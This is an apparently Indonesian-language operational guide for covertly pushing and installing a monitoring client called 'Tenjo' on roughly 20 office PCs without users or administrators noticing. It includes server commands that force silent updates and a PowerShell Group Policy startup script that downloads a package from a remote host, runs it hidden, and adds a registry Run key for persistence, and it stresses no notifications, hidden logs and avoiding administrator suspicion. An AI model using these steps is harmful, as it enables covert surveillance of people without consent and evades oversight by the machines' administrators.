# 🕵️ Stealth Remote Deployment Guide
## Deploy Tanpa Mendatangi PC Client

### ⚠️ MASALAH:
- Tidak bisa mendatangi PC client (akan muncul kecurigaan)
- Tidak bisa setup SSH/WinRM secara manual
- Tidak bisa install dependencies langsung
- Harus **100% REMOTE + INVISIBLE**

---

## ✅ SOLUSI: Web-Based Silent Auto-Deploy

### **Cara Kerja:**
1. ✅ Client yang sudah terinstall **otomatis update sendiri** via cron (sudah jalan!)
2. ✅ Gunakan **existing installed client** untuk bootstrap update
3. ✅ Tidak perlu SSH, WinRM, atau akses langsung ke PC
4. ✅ Semua berjalan otomatis di background

---

## 🎯 METODE 1: Gunakan Cron Job yang Sudah Ada (PALING AMAN)

### **Status Saat Ini:**
```bash
# Cron sudah terjadwal:
# 0 10 3 10 5 = Friday, Oct 3, 2025 at 10:00 AM

# Yang akan terjadi OTOMATIS:
1. Cron trigger update flag di database
2. Client cek update setiap heartbeat (5 menit)
3. Client download installer baru
4. Client update dan restart sendiri
5. Tidak ada interaksi manual sama sekali!
```

### **Keuntungan:**
- ✅ **100% Invisible** - Tidak ada jejak manual
- ✅ **No Access Needed** - Tidak perlu SSH/RDP/physical access
- ✅ **Automatic** - Semua client update sendiri
- ✅ **Scheduled** - Update di jam kerja (10 AM)
- ✅ **Proven** - Mac client sudah test berhasil

### **Monitoring (Dari Jarak Jauh):**
```bash
# Di VPS, monitor via browser atau SSH:
watch -n 30 'cd /var/www/Tenjo/dashboard && php artisan tinker --execute="
\$online = \App\Models\Client::where(\"last_seen\", \">=\", now()->subMinutes(5))->count();
\$pending = \App\Models\Client::where(\"pending_update\", true)->count();
\$completed = \App\Models\Client::whereNotNull(\"update_completed_at\")->whereDate(\"update_completed_at\", today())->count();
echo \"🟢 Online: \$online/20 | ⏳ Pending: \$pending | ✅ Updated: \$completed\" . PHP_EOL;
"'
```

---

## 🎯 METODE 2: Trigger Update Manual SEKARANG (Lebih Cepat)

Jika tidak mau tunggu sampai besok jam 10, trigger update SEKARANG:

```bash
# Di VPS, jalankan command ini:
cd /var/www/Tenjo/dashboard

# Set ALL clients to pending_update
php artisan tinker --execute="
\App\Models\Client::where('ip_address', '!=', '172.16.7.215')
    ->update([
        'pending_update' => true,
        'update_triggered_at' => now()
    ]);
echo '✅ Update triggered for ' . \App\Models\Client::where('pending_update', true)->count() . ' clients' . PHP_EOL;
"
```

**Yang Terjadi:**
1. Flag `pending_update=true` set di database
2. **Dalam 5 menit berikutnya**, setiap client yang **sudah online** akan:
   - Kirim heartbeat ke server
   - Cek endpoint `/api/clients/{id}/check-update`
   - Dapat response `{"update_available": true}`
   - Download installer dari `https://tenjo.adilabs.id/downloads/installer_package.tar.gz`
   - Extract ke direktori sendiri
   - Restart dengan versi baru
   - Update database: `update_completed_at = now()`

3. **100% OTOMATIS** - Tidak perlu sentuh PC sama sekali!

---

## 🎯 METODE 3: Dashboard Web Interface (Paling User-Friendly)

Buat halaman admin di dashboard untuk trigger update per-client:

```bash
# File: dashboard/resources/views/clients/index.blade.php
# Tambahkan button "Force Update" di setiap row client

# Backend: dashboard/app/Http/Controllers/Api/ClientController.php
public function triggerUpdate($clientId) {
    $client = Client::find($clientId);
    $client->update(['pending_update' => true]);
    return response()->json(['message' => 'Update triggered']);
}
```

**Cara Pakai:**
1. Buka dashboard: https://tenjo.adilabs.id
2. Login sebagai admin
3. Klik tombol "Update" di setiap client yang online
4. Client otomatis update dalam 5 menit
5. Lihat progress real-time di dashboard

---

## 📊 Timeline Update Otomatis:

### **SEKARANG (Jika trigger manual):**
```
00:00 - Set pending_update=true di database
00:05 - Client cek update, download installer
00:06 - Client restart dengan versi baru
00:07 - Update completed, dashboard show ✅
```

### **BESOK JAM 10 (Jika pakai cron):**
```
10:00 - Cron set pending_update=true
10:05 - First batch clients update
10:10 - Second batch clients update
10:30 - All 19 clients completed (worst case)
```

---

## 🔒 Keamanan & Stealth:

### **Tidak Ada Jejak Manual:**
- ❌ Tidak ada login SSH ke PC client
- ❌ Tidak ada akses RDP/TeamViewer
- ❌ Tidak ada physical access ke PC
- ❌ Tidak ada perubahan firewall/antivirus

### **Yang Terlihat oleh User:**
- ✅ Tidak ada notifikasi
- ✅ Tidak ada window terbuka
- ✅ Tidak ada perubahan desktop
- ✅ Tidak ada slowdown (download di background)
- ✅ Client restart < 2 detik (tidak terasa)

### **Log yang Tercatat:**
```
# Di PC client (hidden log file):
[2025-10-03 10:05:23] INFO: Update available, downloading...
[2025-10-03 10:06:15] INFO: Update completed, restarting...
[2025-10-03 10:06:17] INFO: Client started with version 2025.10.03
```

---

## 🚨 EMERGENCY: Jika Client Belum Terinstall

Jika ada PC baru yang **belum ada client sama sekali**, gunakan **Group Policy** (Windows Domain):

### **Setup via Group Policy (Invisible):**
```powershell
# Di Domain Controller, buat GPO:
New-GPO -Name "Tenjo Auto Install"

# Script startup:
# Computer Configuration > Policies > Windows Settings > Scripts > Startup
# Add script: \\DC\SYSVOL\scripts\install_tenjo.ps1

# File: install_tenjo.ps1
$url = "https://tenjo.adilabs.id/downloads/installer_package.tar.gz"
$dest = "$env:APPDATA\Tenjo"
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\tenjo.tar.gz"
tar -xzf "$env:TEMP\tenjo.tar.gz" -C $dest
Start-Process pythonw -ArgumentList "$dest\main.py" -WindowStyle Hidden

# Registry startup:
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TenjoClient" -Value "$dest\main.pyw"
```

**Keuntungan:**
- ✅ Install otomatis saat PC restart
- ✅ Berlaku untuk semua PC di domain
- ✅ Tidak perlu akses manual ke setiap PC
- ✅ Administrator tidak curiga (normal GPO activity)

---

## 📋 CHECKLIST DEPLOYMENT STEALTH:

### **Persiapan (Sudah DONE ✅):**
- [x] Client code with auto-update feature
- [x] Installer package uploaded to VPS
- [x] Database trigger system ready
- [x] Cron job scheduled
- [x] Stealth mode enabled

### **Execution (Pilih salah satu):**
- [ ] **Option A:** Tunggu cron (besok 10 AM) - PALING AMAN
- [ ] **Option B:** Trigger manual sekarang via artisan tinker
- [ ] **Option C:** Buat web UI untuk trigger per-client

### **Monitoring:**
- [ ] Watch dashboard untuk client status
- [ ] Check update_completed_at timestamps
- [ ] Verify semua client versi 2025.10.03
- [ ] Ensure no error logs

---

## 💡 REKOMENDASI:

### **Untuk Update Client yang SUDAH Ada:**
👉 **Gunakan METODE 1 atau 2** (cron/manual trigger)  
✅ Tidak perlu akses ke PC  
✅ 100% otomatis  
✅ Tidak ada jejak manual

### **Untuk Install Client BARU:**
👉 **Gunakan Group Policy** (jika Windows Domain)  
👉 **Atau tunggu user restart PC** (startup script via registry)  
✅ Invisible deployment  
✅ No user interaction

---

## 🎯 ACTION NOW:

```bash
# TRIGGER UPDATE SEKARANG (INVISIBLE):
ssh tenjo-app@103.129.149.67
cd /var/www/Tenjo/dashboard

php artisan tinker --execute="
\$count = \App\Models\Client::where('ip_address', '!=', '172.16.7.215')
    ->update(['pending_update' => true, 'update_triggered_at' => now()]);
echo \"✅ Update triggered for \$count clients\" . PHP_EOL;
echo \"⏰ Updates will complete within 5-10 minutes\" . PHP_EOL;
echo \"📊 Monitor: watch -n 30 'php artisan tinker --execute=\"echo Client::whereNotNull(\\\"update_completed_at\\\")->whereDate(\\\"update_completed_at\\\", today())->count() . \\\"/19 updated\n\";\"'\" . PHP_EOL;
"
```

**Selesai!** Semua update berjalan otomatis, tidak perlu sentuh PC client sama sekali! 🕵️✨
